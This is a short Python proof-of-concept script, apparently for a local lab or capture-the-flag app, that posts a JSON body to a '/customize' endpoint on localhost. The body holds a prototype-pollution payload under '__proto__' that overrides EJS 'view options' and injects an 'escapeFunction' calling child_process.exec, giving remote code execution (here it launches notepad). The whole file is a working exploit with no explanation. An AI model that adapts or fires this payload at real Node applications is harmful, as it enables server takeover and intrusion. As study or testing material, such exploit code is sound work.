import requests

headers = {
    'sec-ch-ua-platform': '"Windows"',
    'Referer': 'http://localhost:4243/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"',
    'Content-Type': 'application/json',
    'sec-ch-ua-mobile': '?0',
}

json_data = {
    '__proto__': {
        'view options': {
            'client': 1,
            'escapeFunction': 'JSON.stringify; process.mainModule.require("child_process").exec("notepad"); return "hi"',
        }
    },
    'stats': {
        'top_speed': '1',
        'weight': '1',
        'horsepower': '1',
    },
    'appearance': {
        'color': '1',
        'name': '1',
    },
}

response = requests.post('http://localhost:4243/customize', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"stats":{"top_speed":"1","weight":"1","horsepower":"1"},"appearance":{"color":"1","name":"1"}}'
#response = requests.post('http://localhost:4243/customize', headers=headers, data=data)